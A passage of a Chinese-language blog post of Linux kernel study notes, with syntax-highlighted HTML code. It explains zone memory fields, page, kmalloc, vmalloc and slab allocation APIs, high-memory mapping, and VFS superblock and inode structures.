class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Read access to managed_pages should be safe because it&#x27;s unsigned</span></span><br><span class="line"><span class="comment">	 * long. Write access to zone-&gt;managed_pages and totalram_pages are</span></span><br><span class="line"><span class="comment">	 * protected by managed_page_count_lock at runtime. Idealy only</span></span><br><span class="line"><span class="comment">	 * adjust_managed_page_count() should be used instead of directly</span></span><br><span class="line"><span class="comment">	 * touching zone-&gt;managed_pages and totalram_pages.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		managed_pages;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		spanned_pages;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		present_pages;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span>		*name; <span class="comment">/* 表示该区的名称 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMORY_ISOLATION</span></span><br><span class="line">    </span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		nr_isolate_pageblock; <span class="comment">/* 隔离页面块的数量,它用于解决由于检索页面块迁移类型错误,而导致的不正确的free页计数问题 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMORY_HOTPLUG</span></span><br><span class="line">	<span class="comment">/* see spanned/present_pages for more description */</span></span><br><span class="line">	<span class="keyword">seqlock_t</span>		span_seqlock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> initialized;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Write-intensive fields used from the page allocator */</span></span><br><span class="line">	ZONE_PADDING(_pad1_)</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* free areas of different sizes */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">free_area</span>	<span class="title">free_area</span>[<span class="title">MAX_ORDER</span>];</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* zone flags, see below */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		flags;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">spinlock_t</span>		lock; <span class="comment">/* 自旋锁,主要保护free_area */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Write-intensive fields used by compaction and vmstats. */</span></span><br><span class="line">	ZONE_PADDING(_pad2_)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> percpu_drift_mark; <span class="comment">/* 当可用页面低于此点时,在读取可用页面数时会采取其他步骤,以避免每cpu计数器漂移导致水印被破坏 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined CONFIG_COMPACTION || defined CONFIG_CMA</span></span><br><span class="line">	<span class="comment">/* pfn where compaction free scanner should start */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		compact_cached_free_pfn;</span><br><span class="line">	<span class="comment">/* pfn where async and sync compaction migration scanner should start */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		compact_cached_migrate_pfn[<span class="number">2</span>];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_COMPACTION</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * On compaction failure, 1&lt;&lt;compact_defer_shift compactions</span></span><br><span class="line"><span class="comment">	 * are skipped before trying again. The number attempted since</span></span><br><span class="line"><span class="comment">	 * last failure is tracked with compact_considered.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		compact_considered;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		compact_defer_shift;</span><br><span class="line">	<span class="keyword">int</span>			compact_order_failed;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined CONFIG_COMPACTION || defined CONFIG_CMA</span></span><br><span class="line">	<span class="comment">/* Set to true when the PG_migrate_skip bits should be cleared */</span></span><br><span class="line">	<span class="keyword">bool</span>			compact_blockskip_flush;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">bool</span>			contiguous;</span><br><span class="line"></span><br><span class="line">	ZONE_PADDING(_pad3_)</span><br><span class="line">	<span class="comment">/* Zone statistics */</span></span><br><span class="line">	<span class="keyword">atomic_long_t</span>		vm_stat[NR_VM_ZONE_STAT_ITEMS];</span><br><span class="line">	<span class="keyword">atomic_long_t</span>		vm_numa_stat[NR_VM_NUMA_STAT_ITEMS];</span><br><span class="line">&#125; ____cacheline_internodealigned_in_smp;</span><br></pre></td></tr></table></figure>
<ul>
<li>分配 ZONE_NORMAL 区的内存的方法如下：</li>
</ul>
<p><strong>按页获取内存</strong>：最原始的方法，用于底层获取内存的方式</p>
<div class="table-container">
<table>
<thead>
<tr>
<th><strong>方法</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>alloc_page(gfp_mask)</td>
<td>只分配一页，返回指向页结构的指针</td>
</tr>
<tr>
<td>alloc_pages(gfp_mask, order)</td>
<td>分配 2^order 个页，返回指向第一页页结构的指针</td>
</tr>
<tr>
<td>__get_free_page(gfp_mask)</td>
<td>只分配一页，返回指向其逻辑地址的指针</td>
</tr>
<tr>
<td>__get_free_pages(gfp_mask, order)</td>
<td>分配 2^order 个页，返回指向第一页逻辑地址的指针</td>
</tr>
<tr>
<td>get_zeroed_page(gfp_mask)</td>
<td>只分配一页，让其内容填充为“0”，返回指向其逻辑地址的指针</td>
</tr>
</tbody>
</table>
</div>
<p><strong>按字节获取内存</strong>：使用最多的获取方法</p>
<p>有两种方式进行该种类型的分配：</p>
<ul>
<li>kmalloc：分配的内存物理地址是连续的，虚拟地址也是连续的</li>
<li>vmalloc：分配的内存物理地址是不连续的，虚拟地址是连续的</li>
</ul>
<p>因此在使用中，用的较多的还是 kmalloc：</p>
<ul>
<li>kmalloc 的性能较好</li>
<li>kmalloc 的物理地址和虚拟地址之间的映射比较简单，只需要将物理地址的第一页和虚拟地址第一页关联起来即可</li>
<li>vmalloc 由于物理地址是不连续的，所以要将物理地址的每一页都和虚拟地址关联起来才行</li>
</ul>
<p>PS：其实 kmalloc() 底层也是基于 SLAB 分配器的，只不过它所需要的管理结构头已经按照 2^n 的大小排列事先准备好了而已，这个管理结构体数组是 <code>struct cache_sizes malloc_sizes[]</code></p>
<p><strong>Slab 层获取</strong>：效率最高的获取方法</p>
<p>linux 中的高速缓存是用所谓 slab 层来实现的，slab 层即内核中管理高速缓存的机制，整个 slab 层的原理如下：</p>
<ul>
<li>可以在内存中建立各种对象的高速缓存（比如进程描述相关的结构 task_struct 的高速缓存）</li>
<li>除了针对特定对象的高速缓存以外，也有通用对象的高速缓存</li>
<li>每个高速缓存中包含多个 slab，slab 用于管理缓存的对象</li>
<li>slab 中包含多个缓存的对象，物理上由一页或多个连续的页组成</li>
</ul>
<p>高速缓存 -&gt; slab -&gt; 缓存对象之间的关系如下图：</p>
<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1661432738679-1666871176498.png" class width="1661432738679"> 
<p>用于管理 slab 的结构体如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span>   <span class="comment">/* 存放缓存对象，这个链表有 满，部分满，空 3种状态  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> colouroff; <span class="comment">/* slab 着色的偏移量 */</span></span><br><span class="line">    <span class="keyword">void</span> *s_mem;             <span class="comment">/* 在 slab 中的第一个对象 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> inuse;      <span class="comment">/* slab 中已分配的对象数 */</span></span><br><span class="line">    <span class="keyword">kmem_bufctl_t</span> <span class="built_in">free</span>;      <span class="comment">/* 第一个空闲对象(如果有的话) */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> nodeid;   <span class="comment">/* 应该是在 NUMA 环境下使用 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>低级内核页分配：（当高速缓存中没有空闲的 slab 时才会调用 <strong>kmem_getpages</strong> 函数来分配页）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct page *<span class="title">kmem_getpages</span><span class="params">(struct kmem_cache *cachep, <span class="keyword">gfp_t</span> flags,</span></span></span><br><span class="line"><span class="params"><span class="function">								<span class="keyword">int</span> nodeid)</span></span></span><br></pre></td></tr></table></figure>
<p>高速缓存内核页分配：</p>
<p>高速缓存的创建</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct kmem_cache *</span></span><br><span class="line"><span class="function"><span class="title">kmem_cache_create</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">size_t</span> size, <span class="keyword">size_t</span> align,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags, <span class="keyword">void</span> (*ctor)(<span class="keyword">void</span> *))</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>name：一个字符串，存放着高速缓存的名字</li>
<li>size：高速缓存中每个元素的大小</li>
<li>align：slab 内第一个对象的偏移</li>
<li>flags：标志位，用于控制高速缓存的行为</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>flag</th>
<th>function</th>
</tr>
</thead>
<tbody>
<tr>
<td>SLAB_HWCACHE_ALIGN - 0x00002000U</td>
<td>命令 slab 层把一个 slab 内的所有对象按照高速缓存行进行对齐</td>
</tr>
<tr>
<td>SLAB_POISON - 0x00000800U</td>
<td>使 slab 层用已知的值（a5a5a5a5）填充 slab，有利于对未初始化内存的访问</td>
</tr>
<tr>
<td>SLAB_RED_ZONE -  0x00000400U</td>
<td>使 slab 层在已经分配的内存周围插入“红色警戒区”，用于探测缓冲越界</td>
</tr>
<tr>
<td>SLAB_PANIC - 0x00040000U</td>
<td>当分配失败时提醒 slab 层</td>
</tr>
<tr>
<td>SLAB_CACHE_DMA - 0x00004000U</td>
<td>命令 slab 层分配可以执行 DMA 的内存空间给各个 slab（只有分配对象用于 DMA 时才会使用）</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li>*ctor：高速缓存的构造函数（只有在新的页追加到高速缓存时，构造函数才会被调用），因为 Linux 内核的高速缓存不使用构造函数，所以这里常常被赋值为 NULL</li>
<li>return：指向高速缓存指针 <code>*cachep</code></li>
</ul>
<p>从高速缓存中分配对象</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">kmem_cache_alloc</span><span class="params">(struct kmem_cache *cachep, <span class="keyword">gfp_t</span> flags)</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>cachep：指向高速缓存指针</p>
<ul>
<li>flags：之前讨论的 gfp_mask 标志，只有在高速缓存中所有 slab 都没有空闲对象，并且需要申请新的空间时，这个标志才会起作用</li>
<li>return：指向对象的指针</li>
</ul>
</li>
</ul>
<p>向高速缓存释放对象</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kmem_cache_free</span><span class="params">(struct kmem_cache *cachep, <span class="keyword">void</span> *objp)</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>cachep：指向高速缓存指针</p>
<ul>
<li>objp：要释放的对象的指针</li>
</ul>
</li>
</ul>
<p>高速缓存的销毁</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kmem_cache_destroy</span><span class="params">(struct kmem_cache *cachep)</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>cachep：指向高速缓存指针 </li>
</ul>
<p><strong>高端内存获取</strong></p>
<p>高端内存就是之前提到的 ZONE_HIGHMEM 区的内存，用于满足 “物理地址空间大于虚拟地址空间” 的一些设备的访问需求</p>
<p>在x86体系结构中，这个区的内存不能映射到内核地址空间上（因为 <strong>没有逻辑地址</strong>），为了使用 ZONE_HIGHMEM 区的内存，内核提供了永久映射和临时映射2种手段：</p>
<ul>
<li>永久映射：永久映射的函数是可以睡眠的，所以只能用在进程上下文中（永久映射的数量有限）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">kmap</span><span class="params">(struct page *page)</span> <span class="comment">/* 将ZONE_HIGHMEM区的一个page永久的映射到内核地址空间,返回值即为这个page对应的逻辑地址 */</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">kunmap</span><span class="params">(struct page *page)</span> <span class="comment">/* 允许永久映射的数量是有限的,所以不需要高端内存时,应该及时的解除映射 */</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>临时映射：临时映射不会阻塞，也禁止了内核抢占，所以可以用在中断上下文和其他不能重新调度的地方</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">kmap_atomic</span><span class="params">(struct page *page, <span class="keyword">enum</span> km_type idx)</span> <span class="comment">/* 将ZONE_HIGHMEM区的一个page临时映射到内核地址空间,其中的km_type表示映射的目的(新版kernel不设置这个参数) */</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> kunmap_atomic(addr, idx)    do &#123; pagefault_enable(); &#125; while (0) <span class="comment">/* 相应的解除映射是个宏 */</span></span></span><br></pre></td></tr></table></figure>
<h2 id="虚拟文件系统"><a href="#虚拟文件系统" class="headerlink" title="虚拟文件系统"></a>虚拟文件系统</h2><p>虚拟文件系统（VFS）是 linux 内核和具体 I/O 设备之间的封装的一层共通访问接口，通过这层接口 Linux 内核可以以同一的方式访问各种 I/O 设备，它提供了一个通用的文件系统模型，该模型囊括了任何文件系统的常用功能和行为</p>
<ul>
<li>PS：其实不仅是硬件设备，许多软件机制也会构造 VFS 对象，使用户层可以通过操作文件的形式来操作它们（Linux 中一切皆文件，在这里可以体现）</li>
</ul>
<p>主要有以下好处：</p>
<ul>
<li>简化了应用程序的开发：应用通过统一的系统调用访问各种存储介质</li>
<li>简化了新文件系统加入内核的过程：新文件系统只要实现VFS的各个接口即可，不需要修改内核部分</li>
</ul>
<p>虚拟文件系统本身是 linux 内核的一部分，是纯软件的东西，并不需要任何硬件的支持，其核心就是4个主要对象：</p>
<ul>
<li>超级块：代表一个具体的已安装文件系统</li>
<li>索引结点：代表一个具体的文件</li>
<li>目录项：代表一个目录项，是路径的一个组成部分</li>
<li>文件：代表由进程打开的文件</li>
</ul>
<p><strong>超级块</strong></p>
<p>超级块（super_block）主要存储文件系统相关的信息，这是个针对文件系统级别的概念</p>
<ul>
<li>超级块一般存储在磁盘的特定扇区中</li>
<li>但是对于那些基于内存的文件系统（比如 proc，sysfs），超级块是在使用时创建在内存中的</li>
</ul>
<p>描述超级块的结构体如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * 超级块结构中定义的字段非常多</span></span><br><span class="line"><span class="comment"> * 这里只介绍一些重要的属性</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">super_block</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">s_list</span>;</span>               <span class="comment">/* 指向所有超级块的链表 */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">super_operations</span>    *<span class="title">s_op</span>;</span> <span class="comment">/* 超级块方法 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dentry</span>        *<span class="title">s_root</span>;</span>           <span class="comment">/* 目录挂载点 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span>        <span class="title">s_lock</span>;</span>            <span class="comment">/* 超级块信号量 */</span></span><br><span class="line">    <span class="keyword">int</span>            s_count;                   <span class="comment">/* 超级块引用计数 */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">s_inodes</span>;</span>           <span class="comment">/* inode链表 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mtd_info</span>        *<span class="title">s_mtd</span>;</span>            <span class="comment">/* 存储磁盘信息 */</span></span><br><span class="line">    <span class="keyword">fmode_t</span>            s_mode;                <span class="comment">/* 安装权限 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 其中的 s_op 中定义了超级块的操作方法</span></span><br><span class="line"><span class="comment"> * 这里只介绍一些相对重要的函数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">super_operations</span> &#123;</span></span><br><span class="line">       <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *(*<span class="title">alloc_inode</span>)(<span class="keyword">struct</span> <span class="title">super_block</span> *<span class="title">sb</span>);</span> <span class="comment">/* 创建和初始化一个索引节点对象 */</span></span><br><span class="line">    <span class="keyword">void</span> (*destroy_inode)(struct inode *);                <span class="comment">/* 释放给定的索引节点 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> (*dirty_inode) (struct inode *);                 <span class="comment">/* VFS在索引节点被修改时会调用这个函数 */</span></span><br><span class="line">    <span class="keyword">int</span> (*write_inode) (struct inode *, <span class="keyword">int</span>);             <span class="comment">/* 将索引节点写入磁盘,wait表示写操作是否需要同步 */</span></span><br><span class="line">    <span class="keyword">void</span> (*drop_inode) (struct inode *);                  <span class="comment">/* 最后一个指向索引节点的引用被删除后,VFS会调用这个函数 */</span></span><br><span class="line">    <span class="keyword">void</span> (*delete_inode) (struct inode *);                <span class="comment">/* 从磁盘上删除指定的索引节点 */</span></span><br><span class="line">    <span class="keyword">void</span> (*put_super) (struct super_block *);             <span class="comment">/* 卸载文件系统时由VFS调用,用来释放超级块 */</span></span><br><span class="line">    <span class="keyword">void</span> (*write_super) (struct super_block *);           <span class="comment">/* 用给定的超级块更新磁盘上的超级块 */</span></span><br><span class="line">    <span class="keyword">int</span> (*sync_fs)(struct super_block *sb, <span class="keyword">int</span> wait);     <span class="comment">/* 使文件系统中的数据与磁盘上的数据同步 */</span></span><br><span class="line">    <span class="keyword">int</span> (*statfs) (struct dentry *, struct kstatfs *);    <span class="comment">/* VFS调用该函数获取文件系统状态 */</span></span><br><span class="line">    <span class="keyword">int</span> (*remount_fs) (struct super_block *, <span class="keyword">int</span> *, <span class="keyword">char</span> *); <span class="comment">/* 指定新的安装选项重新安装文件系统时,VFS会调用该函数 */</span></span><br><span class="line">    <span class="keyword">void</span> (*clear_inode) (struct inode *);                 <span class="comment">/* VFS调用该函数释放索引节点,并清空包含相关数据的所有页面 */</span></span><br><span class="line">    <span class="keyword">void</span> (*umount_begin) (struct super_block *);          <span class="comment">/* VFS调用该函数中断安装操作 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>超级块对象通过 <code>alloc_super()</code> 函数创建并初始化（从磁盘读取文件系统超级块，并将信息填充到内存中的超级块对象中）</li>
</ul>
<p><strong>索引节点</strong></p>
<p>索引节点是 VFS 中的核心概念，它包含内核在操作文件或目录时需要的全部信息</p>
<ul>
<li>一个索引节点代表文件系统中的一个文件（Linux 一切皆文件）</li>
<li>Linux 系统为每一个文件都分配了一个 inode 编号，这个编号中记录了文件相关的一些元信息，通过这些元信息可以用来唯一标识一个文件（操作系统上的 inode 并非无穷无尽，通常在你安装操作系统后，系统上的 inode 数量就已经确定了下来）</li>
<li>索引节点和超级块一样是实际存储在磁盘上的，当被应用程序访问到时才会在内存中创建</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 索引节点结构中定义的字段非常多(这里只介绍一些重要的属性) */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span>    <span class="title">i_hash</span>;</span>     <span class="comment">/* 散列表，用于快速查找inode */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">i_list</span>;</span>        <span class="comment">/* 索引节点链表 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">i_sb_list</span>;</span>  <span class="comment">/* 超级块链表超级块  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">i_dentry</span>;</span>   <span class="comment">/* 目录项链表 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>        i_ino;      <span class="comment">/* 节点号 */</span></span><br><span class="line">    <span class="keyword">atomic_t</span>        i_count;        <span class="comment">/* 引用计数 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        i_nlink;    <span class="comment">/* 硬链接数 */</span></span><br><span class="line">    <span class="keyword">uid_t</span>            i_uid;          <span class="comment">/* 使用者id */</span></span><br><span class="line">    <span class="keyword">gid_t</span>            i_gid;          <span class="comment">/* 使用组id */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span>        <span class="title">i_atime</span>;</span>    <span class="comment">/* 最后访问时间 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span>        <span class="title">i_mtime</span>;</span>    <span class="comment">/* 最后修改时间 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span>        <span class="title">i_ctime</span>;</span>    <span class="comment">/* 最后改变时间 */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">inode_operations</span>    *<span class="title">i_op</span>;</span>  <span class="comment">/* 索引节点操作函数 */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>    *<span class="title">i_fop</span>;</span>    <span class="comment">/* 缺省的索引节点操作 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">super_block</span>    *<span class="title">i_sb</span>;</span>              <span class="comment">/* 相关的超级块 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">address_space</span>    *<span class="title">i_mapping</span>;</span>     <span class="comment">/* 相关的地址映射 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">address_space</span>    <span class="title">i_data</span>;</span>         <span class="comment">/* 设备地址映射 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        i_flags;            <span class="comment">/* 文件系统标志 */</span></span><br><span class="line">    <span class="keyword">void</span>            *i_private;             <span class="comment">/* fs 私有指针 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 其中的i_op中定义了索引节点的操作方法(这里只介绍一些相对重要的函数) */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode_operations</span> &#123;</span></span><br><span class="line">    <span class="comment">/* 为dentry对象创造一个新的索引节点 */</span></span><br><span class="line">    <span class="keyword">int</span> (*create) (struct inode *,struct dentry *,<span class="keyword">int</span>, struct nameidata *);</span><br><span class="line">    <span class="comment">/* 在特定文件夹中寻找索引节点,该索引节点要对应于dentry中给出的文件名 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> * (*<span class="title">lookup</span>) (<span class="keyword">struct</span> <span class="title">inode</span> *,<span class="keyword">struct</span> <span class="title">dentry</span> *, <span class="keyword">struct</span> <span class="title">nameidata</span> *);</span></span><br><span class="line">    <span class="comment">/* 创建硬链接 */</span></span><br><span class="line">    <span class="keyword">int</span> (*link) (struct dentry *,struct inode *,struct dentry *);</span><br><span class="line">    <span class="comment">/* 从一个符号链接查找它指向的索引节点 */</span></span><br><span class="line">    <span class="keyword">void</span> * (*follow_link) (struct dentry *, struct nameidata *);</span><br><span class="line">    <span class="comment">/* 在follow_link调用之后,该函数由VFS调用进行清除工作 */</span></span><br><span class="line">    <span class="keyword">void</span> (*put_link) (struct dentry *, struct nameidata *, <span class="keyword">void</span> *);</span><br><span class="line">    <span class="comment">/* 该函数由VFS调用,用于修改文件的大小 */</span></span><br><span class="line">    <span class="keyword">void</span> (*truncate) (struct inode *);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>接下来看看几种类型的索引节点：</p>
<ul>
<li>磁盘索引节点：保存在硬盘中的索引节点</li>
<li>内存索引节点：保存在内存中的索引节点</li>
<li>文件节点：用于指向磁盘索引节点的节点（有助于硬链接的实现）</li>
</ul>
<p>不管是文件还是目录，[磁盘索引节点] 都需要与 [内存索引节点] 进行“绑定”，这样才可以操控磁盘上的数据，文件被打开时，[磁盘索引节点] 被复制到 [内存索引节点]，以便于使用</p>
<p>相关 API 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">ext4_create</span><span class="params">(struct inode *dir, struct dentry *dentry, <span class="keyword">umode_t</span> mode,</span></span></span><br><span class="line"><span class="params"><span class="function">		       <span class="keyword">bool</span> excl)</span> <span class="comment">/* 为dentry对象创建一个新的inode,在创建时使用mode指定模式 */</span></span></span><br><span class="line"><span class="function">struct dentry *<span class="title">ext4_lookup</span><span class="params">(struct inode *dir, struct dentry *dentry, </span></span></span><br><span class="line"><span class="params"><span class="function">                           <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span>; <span class="comment">/* 在特定目录中查找inode */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">ext4_link</span><span 